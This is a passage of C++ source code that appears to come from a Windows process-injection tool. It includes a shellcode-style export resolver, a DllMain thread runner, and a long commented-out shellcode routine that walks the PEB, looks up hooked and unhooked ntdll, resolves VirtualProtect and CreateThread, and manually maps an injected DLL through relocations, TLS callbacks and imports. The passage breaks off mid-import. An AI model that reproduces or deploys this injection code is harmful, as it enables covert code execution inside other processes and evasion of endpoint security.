                            unsigned short val_short_arg = (unsigned short)va_arg(args, unsigned int);
                            WCHAR* num_str_start = UllToHexW(val_short_arg, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR)-1), (sizeof(tempNumBuf)/sizeof(WCHAR)-1));
                            while(*num_str_start && remaining > 0)
                            {
                                *pDest++ = *num_str_start++;
                                remaining--;
                            }
                        }
                        // else if (*(pFmt + 1) == L'u') // handle %hu
                        // {
                        //     pFmt++; // consume 'u'
                        //     unsigned short val = (unsigned short)va_arg(args, unsigned int);
                        //     WCHAR* num_str_start = IntToDecW(val, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR) - 1), (sizeof(tempNumBuf)/sizeof(WCHAR) - 1));
                        //     while (*num_str_start && remaining > 0)
                        //     {
                        //         *pDest++ = *num_str_start++;
                        //         remaining--;
                        //     }
                        // }
                        // Add %hd for short decimal if needed
                        // else if(*(pFmt + 1) == L'd') { /* ... */ }
                        else
                        { // Not 'hs' or 'hX', treat as literal 'h'
                            if(remaining > 0) { *pDest++ = L'%'; remaining--; } // Re-emit the %
                            if(remaining > 0) { *pDest++ = L'h'; remaining--; } // Emit the h
                            // The character that was after 'h' (which wasn't s, X, or x) will be processed in the next loop iteration
                        }
                    break;

                    case L'p': // Pointer (hex) - uses unsigned __int64 for UllToHexW
                    {
                        unsigned __int64 val_ptr_arg = (unsigned __int64)va_arg(args, void*);
                        WCHAR* num_str_start = UllToHexW(val_ptr_arg, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR)-1), (sizeof(tempNumBuf)/sizeof(WCHAR)-1));
                        while(*num_str_start && remaining > 0)
                        {
                            *pDest++ = *num_str_start++;
                            remaining--;
                        }
                        break;
                    }

                    case L'X': // Hex unsigned int (can be extended for %llX for 64-bit)
                    {
                        unsigned __int64 val_arg;
                        if(*pFmt == L'p') val_arg = (unsigned __int64)va_arg(args, void*);
                        else val_arg = (unsigned __int64)va_arg(args, unsigned int); // Promote to 64-bit for UllToHexW

                        WCHAR* num_str_start = UllToHexW(val_arg, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR)-1), (sizeof(tempNumBuf)/sizeof(WCHAR)-1));
                        while(*num_str_start && remaining > 0)
                        {
                            *pDest++ = *num_str_start++;
                            remaining--;
                        }
                        break;
                    }
                    
                    case L'd': // Integer (decimal)
                    {
                        int val_arg = va_arg(args, int);
                        
                        WCHAR* num_str_start = IntToDecW(val_arg, tempNumBuf + (sizeof(tempNumBuf)/sizeof(WCHAR)-1), (sizeof(tempNumBuf)/sizeof(WCHAR)-1));
                        while(*num_str_start && remaining > 0)
                        {
                            *pDest++ = *num_str_start++;
                            remaining--;
                        }
                        break;
                    }
                    
                    case L'%': // Literal percent
                    {                        __debugbreak();
                        if(remaining > 0) { *pDest++ = L'%'; remaining--; }
                        break;
                    }
                        
                    default: // Unknown format specifier, print literally
                    {
                        if(remaining > 0) { *pDest++ = L'%'; remaining--; }
                        if(*pFmt && remaining > 0) { *pDest++ = *pFmt; remaining--; } // Print the char after %
                        break;
                    }
                }
            } 
            else 
            {
                *pDest++ = *pFmt;
                remaining--;
            }
            if(*pFmt) pFmt++; // Move to next format char if not end of string
        }

        va_end(args);
        *pDest = L'\0'; // Null terminate

        if(*pFmt != L'\0') return -1; // Format string not fully processed (ran out of buffer)
        return (int)(pDest - pszDest); // Number of characters written
    }

    
    __declspec(noinline) static void* __stdcall ShellcodeFindExportAddress(HMODULE hModule, LPCSTR lpProcNameOrOrdinal, pfnLoadLibraryA pLoadLibraryAFunc)
    {
        //-----------

        if(!hModule) return nullptr;

        BYTE* base = (BYTE*)hModule;
        
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
        if(dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

        IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
        if(nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

        IMAGE_DATA_DIRECTORY* pExportDataDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; // Use a pointer for clarity
        if (pExportDataDir->VirtualAddress == 0 || pExportDataDir->Size == 0) return nullptr;

        IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + pExportDataDir->VirtualAddress);
        DWORD* functions = (DWORD*)(base + exp->AddressOfFunctions); // RVAs to function bodies or forwarders

        //-----------

        // --- DIFFERENTIATE NAME VS ORDINAL ---
        bool isOrdinalLookup = false;
        WORD ordinalToFind = 0;

        #if defined(_WIN64)
            if (((ULONG_PTR)lpProcNameOrOrdinal >> 16) == 0)    // High bits of pointer are zero
            {
                isOrdinalLookup = true;
                ordinalToFind = LOWORD((ULONG_PTR)lpProcNameOrOrdinal);
            }
        #else // For 32-bit shellcode
            // For 32-bit, HIWORD macro is on a DWORD. ULONG_PTR might be 64-bit if compiled for x64 targeting x86.
            // Ensure lpProcNameOrOrdinal is treated as a 32-bit value for HIWORD.
            if (HIWORD((DWORD)(ULONG_PTR)lpProcNameOrOrdinal) == 0)
            { 
                isOrdinalLookup = true;
                ordinalToFind = LOWORD((DWORD)(ULONG_PTR)lpProcNameOrOrdinal);
            }
        #endif
        // --- END DIFFERENTIATION LOGIC ---

        DWORD funcRVA = 0; // RVA of the function/forwarder

        if (isOrdinalLookup)
        {
            if (ordinalToFind < exp->Base || (ordinalToFind - exp->Base) >= exp->NumberOfFunctions)
            {
                LOG_W(L"    [SFEA] Ordinal %hu is out of range (Base: %u, NumberOfFunctions: %u)", ordinalToFind, exp->Base, exp->NumberOfFunctions);
                return nullptr;
            }
            
            DWORD functionIndexInArray = ordinalToFind - exp->Base;
            if (functionIndexInArray >= exp->NumberOfFunctions) return nullptr;
            
            funcRVA = functions[functionIndexInArray];
        }
        else
        {
            // --- NAME LOOKUP PATH ---
            LPCSTR funcName = lpProcNameOrOrdinal;
            if (!funcName || *funcName == '\0') return nullptr;

            DWORD* nameRVAs = (DWORD*)(base + exp->AddressOfNames);          // RVAs to ASCII name strings
            WORD* nameOrdinals = (WORD*)(base + exp->AddressOfNameOrdinals); // Indices into the 'functions' array (NOT necessarily the export ordinals themselves)

            bool foundByName = false;
            for (DWORD i = 0; i < exp->NumberOfNames; ++i)
            {
                char* currentExportName = (char*)(base + nameRVAs[i]);
            
                if (isSame(currentExportName, funcName)) 
                {
                    WORD functionIndexInArray = nameOrdinals[i];            //index into the 'functions' array
            
                    // Bounds check for the index obtained from nameOrdinals
                    if (functionIndexInArray >= exp->NumberOfFunctions)
                    {
                        LOG_W(L"Name '%hs' gave an ordinal array index %hu out of bounds (%u).", funcName, functionIndexInArray, exp->NumberOfFunctions);
                        return nullptr;
                    }

                    funcRVA = functions[functionIndexInArray];
                    if (funcRVA == 0) return nullptr; // Should not happen for a named export pointing to a valid index

                    foundByName = true;
                    break;
                }
            }
        
            if(!foundByName)
            {
                LOG_W(L"Name '%hs' not found in export table.", funcName);
                return nullptr;
            }
        }

        if (funcRVA == 0)
        {
            LOG_W(L"RVA for %p in module 0x%p is zero.", lpProcNameOrOrdinal, hModule);
            return nullptr; // No valid RVA found
        } 

        BYTE* addr = base + funcRVA;

        // Check if this RVA points within the export directory itself (indicates a forwarded export)
        if (funcRVA >= pExportDataDir->VirtualAddress && funcRVA < (pExportDataDir->VirtualAddress + pExportDataDir->Size)) 
        {
            // This is a forwarder string like "OTHERDLL.OtherFunction"
            char* originalForwarderString = (char*)addr;
            LOG_W(L"    [SFEA] Proc %p from module 0x%p is forwarded to: '%hs'", lpProcNameOrOrdinal, hModule, originalForwarderString);

            if (!pLoadLibraryAFunc)
            {
                LOG_W(L"    [SFEA] pLoadLibraryAFunc is nullptr, cannot resolve forwarder for %hs", originalForwarderString);
                return nullptr;
            }

            // --- PARSING: Work with a local, writable copy ---
            char localForwarderBuffer[256];
            UINT k_copy = 0;
            
            char* pOrig = originalForwarderString;
            while (*pOrig != '\0' && k_copy < (sizeof(localForwarderBuffer) - 1))
            {
                localForwarderBuffer[k_copy++] = *pOrig++;
            }
            localForwarderBuffer[k_copy] = '\0';


            char* dotSeparatorInLocal = nullptr;
            char* tempParserPtr = localForwarderBuffer;

            while (*tempParserPtr != '\0') 
            {
                if (*tempParserPtr == '.')
                {
                    dotSeparatorInLocal = tempParserPtr;
                    break;
                }
                ++tempParserPtr;
            }
            if (!dotSeparatorInLocal || dotSeparatorInLocal == localForwarderBuffer) { LOG_W(L"    [SFEA] Malformed forwarder string (in copy): '%hs'", localForwarderBuffer); return nullptr; }


            *dotSeparatorInLocal = '\0'; 
            char* forwardedFuncNameOrOrdinalStr = dotSeparatorInLocal + 1;
            if (*forwardedFuncNameOrOrdinalStr == '\0') { LOG_W(L"    [SFEA] Malformed forwarder string (nothing after dot in copy): '%hs'", localForwarderBuffer); return nullptr; }
            
            char* forwardedDllName = localForwarderBuffer;
            HMODULE hForwardedModule = pLoadLibraryAFunc(forwardedDllName);
            if (!hForwardedModule)
            {
                LOG_W(L"    [SFEA] Failed to load forwarded DLL: '%hs' (original forwarder was: '%hs')", forwardedDllName, originalForwarderString);
                return nullptr;
            }

            LOG_W(L"    [SFEA] Successfully loaded forwarded DLL: '%hs' to 0x%p", forwardedDllName, (void*)hForwardedModule);

            LPCSTR finalProcNameToResolve;
            if (*forwardedFuncNameOrOrdinalStr == '#') // Forwarding to an ordinal, e.g., "#123"
            {
                WORD fwdOrdinal = 0;
                char* pNum = forwardedFuncNameOrOrdinalStr + 1; // Skip '#'
                while (*pNum >= '0' && *pNum <= '9')
                {
                    fwdOrdinal = fwdOrdinal * 10 + (*pNum - '0');
                    pNum++;
                }

                // Check if any digits were actually parsed for the ordinal
                if (pNum == (forwardedFuncNameOrOrdinalStr + 1) && fwdOrdinal == 0)  // No digits after #, or #0 was not intended
                {
                    if (*(forwardedFuncNameOrOrdinalStr + 1) != '0' || *(forwardedFuncNameOrOrdinalStr + 2) != '\0')    // Allow "#0" but not "#" or "#abc"
                    {
                        LOG_W(L"    [SFEA] Invalid forwarded ordinal format (no valid number after #): %hs", forwardedFuncNameOrOrdinalStr);
                        return nullptr;
                    }
                }
                
                finalProcNameToResolve = (LPCSTR)(ULONG_PTR)fwdOrdinal;
                LOG_W(L"    [SFEA] Forwarding to ordinal %hu in '%hs'", fwdOrdinal, forwardedDllName);
            } 
            else // Forwarding to a name
            {
                finalProcNameToResolve = forwardedFuncNameOrOrdinalStr;
                LOG_W(L"    [SFEA] Forwarding to name '%hs' in '%hs'", finalProcNameToResolve, forwardedDllName);
            }

            return ShellcodeFindExportAddress(hForwardedModule, finalProcNameToResolve, pLoadLibraryAFunc);
        }       
        else return (void*)addr;
    }

    __declspec(noinline) static DWORD WINAPI DllMainThreadRunner(LPVOID lp_Passed_HeapParameters)
    {
        pfnDLLMain local_pfnDllMain;
        HINSTANCE local_hinstDLL;
        pfnRtlFreeHeap local_pfnRtlFreeHeap;
        VOID* local_vpAllocatedHeap;
        VOID* local_vp_target_processHeap;

        if (!lp_Passed_HeapParameters) return 1;

        {
            PDLLMAIN_THREAD_PARAMS params = (PDLLMAIN_THREAD_PARAMS)lp_Passed_HeapParameters;
            if (!params->pfnDllMain || !params->hinstDLL || !params->vpAllocatedHeap || !params->pRtlFreeHeap) return 1;

            local_pfnDllMain = params->pfnDllMain;
            local_hinstDLL = params->hinstDLL;
            local_vpAllocatedHeap = params->vpAllocatedHeap;
            local_pfnRtlFreeHeap = params->pRtlFreeHeap;
            local_vp_target_processHeap = params->vpTarget_process_Heap;

            
            // BOOL result = params->pfnDllMain(params->hinstDLL, DLL_PROCESS_ATTACH, NULL);
            BOOL result = local_pfnDllMain(local_hinstDLL, DLL_PROCESS_ATTACH, NULL);
            local_pfnRtlFreeHeap(local_vp_target_processHeap, 0, local_vpAllocatedHeap);

            return result ? 0 : 1;
        }

    }


    #pragma region Actual_stuff_commented
    // __declspec(noinline) void __stdcall shellcode(LPVOID lpParameter)
    // {
    //     #pragma region Shellcode_setup

    //     struct _LIBS
    //     {
    //         HMODULE hHookedNtdll;
    //         HMODULE hUnhookedNtdll;
    //         HMODULE hKERNEL32;
    //         HMODULE hKERNELBASE;
    //         HMODULE hUsr32;
    //     }sLibs;

    //     typedef struct _CACHED_PROTECTIONS_OF_REGIONS
    //     {
    //         DWORD CachedSectionRVA;
    //         DWORD Cachedcharacteristics;
    //         BYTE* pCachedSectionMemoryBase;
    //         SIZE_T CachedSectionVirtualSize;
    //         char CachedcurrentSectionNameAnsi[IMAGE_SIZEOF_SHORT_NAME + 1];
    //     } CACHED_PROTECTIONS_OF_REGIONS, *PCACHED_PROTECTIONS_OF_REGIONS;

    //     typedef struct _MY_PEB_LDR_DATA
    //     {
    //         ULONG Length;
    //         BOOLEAN Initialized;
    //         PVOID  SsHandle;
    //         LIST_ENTRY InLoadOrderModuleList;
    //         LIST_ENTRY InMemoryOrderModuleList;
    //         LIST_ENTRY InInitializationOrderModuleList;
    //     } MY_PEB_LDR_DATA, *MY_PPEB_LDR_DATA;

    //     typedef struct _LDR_DATA_TABLE_ENTRY
    //     {
    //         LIST_ENTRY InLoadOrderLinks;
    //         LIST_ENTRY InMemoryOrderLinks;
    //         LIST_ENTRY InInitializationOrderLinks;
    //         PVOID DllBase;
    //         UNICODE_STRING FullDllName;
    //         UNICODE_STRING BaseDllName;
    //     } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;    

    //     _RESOURCES* pResources = (_RESOURCES*)lpParameter;

    //     #ifdef _M_IX86
    //         PEB* pPEB = (PEB*) __readfsdword(0x30);
    //     #else
    //         PEB* pPEB = (PEB*) __readgsqword(0x60);   
    //     #endif
        
    //     MY_PEB_LDR_DATA* pLdr = (MY_PEB_LDR_DATA*)pPEB->Ldr;
    //     auto head = &pLdr->InLoadOrderModuleList;
    //     auto current = head->Flink;    // first entry is the EXE itself
        
    //     //walk load‑order
    //     while(current != head)
    //     {
    //         auto entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

    //         if(entry->BaseDllName.Buffer)
    //         {
    //             const WCHAR* namePtr;
    //             SIZE_T nameLen;

    //             HelperSplitFilename(entry->BaseDllName.Buffer, entry->BaseDllName.Length / sizeof(WCHAR), &namePtr, &nameLen);

    //             SIZE_T k32len = sizeof(kUsr32)/sizeof(WCHAR) - 1;
    //             if(nameLen == k32len && isSameW(namePtr, kUsr32, k32len)) sLibs.hUsr32 = (HMODULE)entry->DllBase;

    //             k32len = sizeof(hKernelbase)/sizeof(WCHAR) - 1;
    //             if(nameLen == k32len && isSameW(namePtr, hKernelbase, k32len)) sLibs.hKERNELBASE = (HMODULE)entry->DllBase;

    //             k32len = sizeof(kNtdll)/sizeof(WCHAR) - 1;
    //             if(nameLen == k32len && isSameW(namePtr, kNtdll, k32len)) sLibs.hHookedNtdll = (HMODULE)entry->DllBase;
    //         }
    //         current = current->Flink;
    //     }
    //     if(sLibs.hUsr32 == NULL || sLibs.hKERNELBASE == NULL) __debugbreak();
        
    //     ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //     my_OutputDebugStringW = (pfnOutputDebugStringW)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cOutputDebugStringWFunction, my_LoadLibraryA);
    //     if(my_OutputDebugStringW == NULL) __debugbreak();

    //     my_MessageBoxW = (pfnMessageBoxW)ShellcodeFindExportAddress(sLibs.hUsr32, cMessageBoxWFunction, my_LoadLibraryA);
    //     if(my_MessageBoxW == NULL) __debugbreak();

    //     my_LoadLibraryA = (pfnLoadLibraryA)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cLoadLibraryAFunction, my_LoadLibraryA);
    //     if(my_LoadLibraryA == NULL) __debugbreak();

    //     my_VirtualProtect = (pfnVirtualProtect)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cVirtualProtectFunction, my_LoadLibraryA);
    //     if(my_VirtualProtect == NULL) __debugbreak();

    //     my_CreateThread = (pfnCreateThread)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cCreateThreadFunction, my_LoadLibraryA);
    //     if(my_CreateThread == NULL) __debugbreak();

    //     my_CloseHandle = (pfnCloseHandle)ShellcodeFindExportAddress(sLibs.hKERNELBASE, cCloseHandleFunction, my_LoadLibraryA);
    //     if(my_CloseHandle == NULL) __debugbreak();
        
    //     my_RtlFillMemory = (pfnRtlFillMemory)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cRtlFillMemoryFunction, my_LoadLibraryA);
    //     if(my_RtlFillMemory == NULL) __debugbreak();

    //     my_NtFreeVirtualMemory = (pfnNtFreeVirtualMemory)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cNtFreeVirtualMemoryFunction, my_LoadLibraryA);
    //     if(my_NtFreeVirtualMemory == NULL) __debugbreak();

    //     my_RtlExitUserThread = (pfnRtlExitUserThread)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cRtlExitUserThreadFunction, my_LoadLibraryA);
    //     if(my_RtlExitUserThread == NULL) __debugbreak();

    //     my_NtProtectVirtualMemory = (pfnNtProtectVirtualMemory)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cNtProtectVirtualMemoryFunction, my_LoadLibraryA);
    //     if(my_NtProtectVirtualMemory == NULL) __debugbreak();
        
    //     my_NtDelayExecution = (pfnNtDelayExecution)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cNtDelayExecutionFunction, my_LoadLibraryA);
    //     if(my_NtDelayExecution == NULL) __debugbreak();
        
    //     my_RtlAllocateHeap = (pfnRtlAllocateHeap)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cRtlAllocateHeapFunction, my_LoadLibraryA);
    //     if(my_RtlAllocateHeap == NULL) __debugbreak();
        
    //     my_RtlFreeHeap = (pfnRtlFreeHeap)ShellcodeFindExportAddress(sLibs.hHookedNtdll, cRtlFreeHeapFunction, my_LoadLibraryA);
    //     if(my_RtlFreeHeap == NULL) __debugbreak();
        
    //     ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    //     // __declspec(allocate(".stub")) static const WCHAR INJECTED[] = L"INJECTED"; __declspec(allocate(".stub")) static const WCHAR s2[] = L"Hello from injected shellcode!";
    //     // // my_MessageBoxW(NULL, s2, INJECTED, MB_OK | MB_TOPMOST);
    //     // my_OutputDebugStringW(s2);

    //     __declspec(allocate(".stub")) static const WCHAR s2[] = L"Hello from injected shellcode!";
    //     ShellcodeSprintfW(g_shellcodeLogBuffer, sizeof(g_shellcodeLogBuffer)/sizeof(WCHAR), s2);
        
    //     LOG_W(L"//////////////////////////////////////////////////////////");
    //     LOG_W(L"Injected_dll_base -> 0x%p", pResources->Injected_dll_base);
    //     LOG_W(L"Resource_base ->  0x%p\n", pResources->ResourceBase);
    //     LOG_W(L"Shellcode_base ->  0x%p", pResources->Injected_Shellcode_base);
    //     LOG_W(L"-----------------------------------------------------------");

    //     IMAGE_DOS_HEADER* pDosHeader_injected_dll = (IMAGE_DOS_HEADER*) pResources->Injected_dll_base;
    //     if(pDosHeader_injected_dll->e_magic != 0x5A4D)
    //     {
    //         LOG_W(L"[!!!!] Invalid DOSHeader signature");
    //         return;
    //     }else LOG_W(L"DOSHeader signature-> 0x%hX [OK]", pDosHeader_injected_dll->e_magic);
        
        
    //     DWORD peOffset_injected_dll = pDosHeader_injected_dll->e_lfanew;
        
    //     IMAGE_NT_HEADERS* pNtHeader_injected_dll = (IMAGE_NT_HEADERS*)(pResources->Injected_dll_base + peOffset_injected_dll);
    //     if(pNtHeader_injected_dll->Signature != IMAGE_NT_SIGNATURE)
    //     {
    //         LOG_W(L"[!!!!] Invalid NTHeader signature");
    //         return;
    //     }else LOG_W(L"NTHeader signature-> 0x%X [OK]", pNtHeader_injected_dll->Signature);

    //     IMAGE_OPTIONAL_HEADER* pOptionalHeader_injected_dll = &pNtHeader_injected_dll->OptionalHeader;
    //     if(pOptionalHeader_injected_dll->Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)
    //     {
    //         LOG_W(L"[!!!!] Invalid OptionalHeader Magic");
    //         return;
    //     }else LOG_W(L"OptionalHeader Magic-> 0x%X [OK]", pOptionalHeader_injected_dll->Magic);

    //     IMAGE_FILE_HEADER* pFileHeader_injected_dll = (IMAGE_FILE_HEADER*)(&pNtHeader_injected_dll->FileHeader);
    //     if(pFileHeader_injected_dll->Machine != IMAGE_FILE_MACHINE_AMD64)
    //     {
    //         LOG_W(L"[!!!!] Invalid FileHeader Machine type");
    //         return;
    //     }else LOG_W(L"FileHeader Machine-> 0x%X [OK]", pFileHeader_injected_dll->Machine);
    //     LOG_W(L"-----------------------------------------------------------");
        
    //     #pragma endregion

    //     //==========================================================================================

    //     #pragma region Relocations

    //     size_t delta = (uintptr_t)pResources->Injected_dll_base - pOptionalHeader_injected_dll->ImageBase;
    //     if(delta)
    //     {
    //         LOG_W(L"            Relocation\nDelta calculated: 0x%p", (void*)delta);

    //         IMAGE_DATA_DIRECTORY* dataDir = pOptionalHeader_injected_dll->DataDirectory;
    //         IMAGE_DATA_DIRECTORY relocDirEntry = dataDir[IMAGE_DIRECTORY_ENTRY_BASERELOC];

    //         if(relocDirEntry.Size > sizeof(IMAGE_BASE_RELOCATION) && relocDirEntry.VirtualAddress != 0)
    //         {
    //             BYTE* pCurrentRelocBlockAddress = pResources->Injected_dll_base + relocDirEntry.VirtualAddress;
    //             BYTE* pEndOfRelocData = pCurrentRelocBlockAddress + relocDirEntry.Size;
    //             UINT noOfAbsoluteRelocs = 0, noOfHighlowRelocs = 0, noOfDir64Relocs = 0; 

    //             while(pCurrentRelocBlockAddress < pEndOfRelocData)
    //             {
    //                 IMAGE_BASE_RELOCATION* pBlock = (IMAGE_BASE_RELOCATION*)pCurrentRelocBlockAddress;

    //                 if(pBlock->SizeOfBlock == 0) { LOG_W(L"Encountered a relocation block with SizeOfBlock = 0. Ending relocation processing."); break;}
                    
    //                 DWORD BaseRVAForBlock = pBlock->VirtualAddress;
    //                 size_t numberOfEntriesInBlock = (pBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;                // 2 -> sizeof(word)
    //                 WORD* pListEntry = (WORD*)(pBlock + 1);

    //                 for(UINT i = 0; i < numberOfEntriesInBlock; ++i)
    //                 {
    //                     WORD currentEntry = pListEntry[i];
    //                     int relocationType = currentEntry >> 12;
    //                     int offsetInPage = currentEntry & 0x0FFF;
                        
    //                     BYTE* pAddressToPatch = pResources->Injected_dll_base + BaseRVAForBlock + offsetInPage;

    //                     switch(relocationType)
    //                     {
    //                         case IMAGE_REL_BASED_ABSOLUTE:
    //                         {
    //                             //Do nothing. This is a padding/sentinel entry
    //                             noOfAbsoluteRelocs += 1;
    //                             break;
    //                         }

    //                         case IMAGE_REL_BASED_HIGHLOW:
    //                         {
    //                             DWORD* patchValuePointer = (DWORD*)pAddressToPatch;
    //                             *patchValuePointer = *patchValuePointer + (DWORD)delta;
                                
    //                             // LOG_W(L"Applied HIGHLOW relocation at [0x%p] by adding [0x%X]", pAddressToPatch, delta);
    //                             noOfHighlowRelocs +=1;
    //                             break;
    //                         }           

    //                         case IMAGE_REL_BASED_DIR64:
    //                         {
    //                             DWORD_PTR* patchValuePointer = (DWORD_PTR*)pAddressToPatch;
    //                             *patchValuePointer = *patchValuePointer + delta;

    //                             // LOG_W(L"Applied IMAGE_REL_BASED_DIR64 relocation at [0x%p] by adding [0x%X]", pAddressToPatch, delta);
    //                             noOfDir64Relocs +=1;
    //                             break;
    //                         }

    //                         default:
    //                         {
    //                             LOG_W(L"Unknown or unhandled relocation type: 0x%hX at 0x%p", (WORD)relocationType, pAddressToPatch);
    //                             break;
    //                         }              
    //                     }
    //                 }
    //                 pCurrentRelocBlockAddress = pCurrentRelocBlockAddress + pBlock->SizeOfBlock;
    //             }
    //             LOG_W(L"Absolute relocations: %d\nHighLow relocations: %d\nDir64 relocations: %d", noOfAbsoluteRelocs, noOfHighlowRelocs, noOfDir64Relocs);
    //         }
    //         else LOG_W(L"No relocation data found or .reloc section is empty");

    //         LOG_W(L"            Relocations Done\n-----------------------------------------------------------");

    //     }
    //     else LOG_W(L"No relocations required\n-----------------------------------------------------------");
    //     #pragma endregion

    //     //==========================================================================================

    //     #pragma region TLSCallbacks

    //     LOG_W(L"            TLS_Callbacks");

    //     IMAGE_DATA_DIRECTORY* pDataDirectoryArray = pNtHeader_injected_dll->OptionalHeader.DataDirectory;
    //     IMAGE_DATA_DIRECTORY tlsDirEntryStruct  = pDataDirectoryArray[IMAGE_DIRECTORY_ENTRY_TLS];

    //     if(tlsDirEntryStruct.Size < sizeof(IMAGE_TLS_DIRECTORY) || tlsDirEntryStruct.VirtualAddress == 0)
    //     {
    //         LOG_W(L"No TLS Directory found, or its size is invalid/empty. Skipping");
    //     }
    //     else
    //     {
    //         LOG_W(L"TLS Directory Entry: VA=0x%X, Size=0x%X", tlsDirEntryStruct.VirtualAddress, tlsDirEntryStruct.Size);

    //         BYTE* pMemoryAddressOfTlsDirectoryStruct = pResources->Injected_dll_base + tlsDirEntryStruct.VirtualAddress;
    //         IMAGE_TLS_DIRECTORY* pTlsStruct = (IMAGE_TLS_DIRECTORY*)pMemoryAddressOfTlsDirectoryStruct;
    //         LOG_W(L"Actual IMAGE_TLS_DIRECTORY structure is at 0x%p", pMemoryAddressOfTlsDirectoryStruct);

    //         uintptr_t vaOfCallbackArrayPointer = pTlsStruct->AddressOfCallBacks;
    //         if(vaOfCallbackArrayPointer == NULL) LOG_W(L"TLS Directory.AddressOfCallBacks is NULL, no callback array defined");
    //         else
    //         {   
    //             //PIMAGE_TLS_CALLBACK* is a pointer to a pointer to a callback function
    //             PIMAGE_TLS_CALLBACK* pActualMemoryAddressOfCallbackArray;

    //             if(delta != 0)
    //             {
    //                 pActualMemoryAddressOfCallbackArray = (PIMAGE_TLS_CALLBACK*)vaOfCallbackArrayPointer;
    //                 LOG_W(L"Delta non-zero. Assuming AddressOfCallBacks field (0x%p) absolute ptr to the callback array", (void*)vaOfCallbackArrayPointer);
    //             }
    //             else
    //             {
    //                 uintptr_t rvaOfCallbackArray = vaOfCallbackArrayPointer - pOptionalHeader_injected_dll->ImageBase;
    //                 pActualMemoryAddressOfCallbackArray = (PIMAGE_TLS_CALLBACK*)(pResources->Injected_dll_base + rvaOfCallbackArray);

    //                 LOG_W(L"Delta is zero. AddressOfCallBacks field (VA 0x%p) rebased to callback array ptr 0x%p", (void*)vaOfCallbackArrayPointer, (void*)pActualMemoryAddressOfCallbackArray);
    //             }

    //             PIMAGE_TLS_CALLBACK* currentArrayElementPtr = pActualMemoryAddressOfCallbackArray;
    //             LOG_W(L"VA of callback array is 0x%p. Actual memory address of this array is 0x%p", vaOfCallbackArrayPointer, pActualMemoryAddressOfCallbackArray);

    //             UINT NoOfCallBacks = 0;
    //             while(*currentArrayElementPtr != NULL)
    //             {
    //                 uintptr_t vaOfIndividualCallback = (uintptr_t)*currentArrayElementPtr;
    //                 uintptr_t rvaOfIndividualCallback = vaOfIndividualCallback - pOptionalHeader_injected_dll->ImageBase;

    //                 PIMAGE_TLS_CALLBACK actualFunctionAddressToCall = (PIMAGE_TLS_CALLBACK)(pResources->Injected_dll_base + rvaOfIndividualCallback);
    //                 LOG_W(L"Found TLS callback entry. Original VA of function: 0x%p. Actual function address: 0x%p. Invoking...", (void*)vaOfIndividualCallback, actualFunctionAddressToCall);

    //                 //Call it
    //                 actualFunctionAddressToCall((PVOID)pResources->Injected_dll_base, DLL_PROCESS_ATTACH, NULL);
    //                 ++currentArrayElementPtr;
    //                 ++NoOfCallBacks;
    //             }
    //             LOG_W(L"Done TLS callbacks. Total callbacks: %d", NoOfCallBacks);
    //         }            
    //     }

    //     LOG_W(L"            TLS_Callbacks\n-----------------------------------------------------------");
    //     #pragma endregion

    //     //==========================================================================================

    //     #pragma region Import Resolution

    //     IMAGE_DATA_DIRECTORY importDirEntry = pOptionalHeader_injected_dll->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    //     if(importDirEntry.VirtualAddress == 0 || importDirEntry.Size < sizeof(IMAGE_DATA_DIRECTORY)) LOG_W(L"No Import Directory found. No imports to resolve");
    //     else
    //     {
    //         BYTE* pCurrentImportDescriptorAddress = pResources->Injected_dll_base + importDirEntry.VirtualAddress;
    //         IMAGE_IMPORT_DESCRIPTOR* pDesc = (IMAGE_IMPORT_DESCRIPTOR*)pCurrentImportDescriptorAddress;

    //         while(pDesc->Name != 0)
    //         {

    //             DWORD rvaOfDllName = pDesc->Name;
    //             char* dllNameString = (char*)(pResources->Injected_dll_base + rvaOfDllName);

    //             LOG_W(L"\n------Processing imports for DLL: [%hs]------", dllNameString);
                
    //             HANDLE hDependentdll = my_LoadLibraryA(dllNameString);
    //             if(hDependentdll == NULL)
    //             {
    //                 LOG_W(L"FAILED to load dependent DLL: [%hs]", dllNameString);
    //                 ++pDesc;
    //                 continue;
    //             }

    //             IMAGE_THUNK_DATA* pImportNameTable = NULL;
    //             IMAGE_THUNK_DATA* pImportAddressTable = NULL;

    //             //The `OriginalFirstThunk` (OFT) contains the information (name or ordinal) used to look up the function
    //             //The `FirstThunk` (IAT) is the table that gets *patched* with the actual resolved function addresses.
    //             DWORD rvaOFT = pDesc->OriginalFirstThunk;
    //             DWORD rvaIAT = pDesc->FirstThunk;

    //             if(rvaOFT != 0) pImportNameTable = (IMAGE_THUNK_DATA*)(pResources->Injected_dll_base + rvaOFT);
    //             else pImportNameTable = (IMAGE_THUNK_DATA*)(pResources->Injected_dll_base + rvaIAT);
            
    //             pImportAddressTable = (IMAGE_THUNK_DATA*)(pResources->Injected_dll_base + rvaIAT);
